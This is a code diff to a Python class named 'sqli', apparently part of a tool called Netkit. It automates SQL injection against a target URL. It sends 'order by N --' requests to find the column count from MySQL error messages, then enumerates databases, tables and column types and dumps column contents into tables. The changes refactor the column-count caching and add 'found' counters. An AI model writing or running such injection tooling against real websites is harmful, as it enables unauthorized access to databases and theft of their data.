@@ -50,6 +50,8 @@ class sqli():
                 break
 
             request = request[co:fi]
+            if column:
+                request = request.replace("unsigned", "")
             infos.append(request)
             new = []
             if infos[0] == ' ': del infos[0]
@@ -95,20 +97,21 @@ class sqli():
         request = ""
         self.num = 1
         self.fncexiste = False
-        while not "warning: mysql" in request.lower() and not "unknown column" in request.lower():
 
-            self.url = self.args.u.lower().replace("http://", "")
-            self.url = self.url.replace("https://", "")
-            self.url = self.url.replace("www.", "www").replace("/", "-")
-            self.url = f".num-columns-{self.url}"
+        self.url = self.args.u.lower().replace("http://", "")
+        self.url = self.url.replace("https://", "")
+        self.url = self.url.replace("www.", "www").replace("/", "-")
+        self.url = f".num-columns-{self.url}"
 
-            open(self.url, "a").write(" ")
-            file = open(self.url, "r")
-            texto = file.read().replace(" ", "")
-            if texto != "":
-                self.fncexiste = True
-                self.num = int(texto)
-                break
+        open(self.url, "a").write(" ")
+        file = open(self.url, "r")
+        texto = file.read().replace(" ", "")
+
+        if texto != "":
+            self.fncexiste = True
+            self.num = int(texto)
+
+        while not "warning: mysql" in request.lower() and not "unknown column" in request.lower() and not self.fncexiste:
 
             try:
                 request = requests.get(f"{self.args.u} order by {self.num} --").text
@@ -151,14 +154,16 @@ class sqli():
             print("Netkit: Args invalids")
             exit()
 
-        return typee 
+        return typee
 
 
 
-    def dividora(self, str, ini):
+    def divisora(self, res, ini):
         st = []
-        for i in range(len(str.split())//2):
-            st.append(str.split()[ini])
+        res = res.split()
+
+        for i in range(len(res)//2):
+            st.append(res[ini])
             ini += 2
         return st
 
@@ -207,12 +212,13 @@ class sqli():
 
             if not res == "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m":
 
+                print(f"\033[01;32m[+]\033[0;0m\033[01;39m{len(res.split())} tables found\n\033[0;0m")
+
                 t = PrettyTable()
                 t.add_column(db, res.split())
                 print(t)
 
             else: print(res)
-#        exit()
 
 
         elif self.args.columns:
@@ -228,9 +234,11 @@ class sqli():
 
             if not res == "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m":
 
+                print(f"\033[01;32m[+]\033[0;0m\033[01;39m{len(res.split())//2} columns found\n\033[0;0m")
+
                 t = PrettyTable()
-                t.add_column(table, self.dividora(res, 0))
-                t.add_column("Type", self.dividora(res, 1))
+                t.add_column(table, self.divisora(res, 0))
+                t.add_column("Type", self.divisora(res, 1))
                 print(t)
 
             else: print(res)
@@ -246,7 +254,6 @@ class sqli():
             self.pulln_columns()
             t = PrettyTable()
             err = False
-            print()
 
             for i in columns.split(","):
                 res = self.sqli(i, f"{db}.{table}", C=True)
@@ -268,6 +275,7 @@ class sqli():
 
             if not res == "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m":
 
+                print(f"\033[01;32m[+]\033[0;0m\033[01;39m{len(res.split())} Databases found\n\033[0;0m")
                 t = PrettyTable()
                 t.add_column("Database", res.split())
                 print(t)
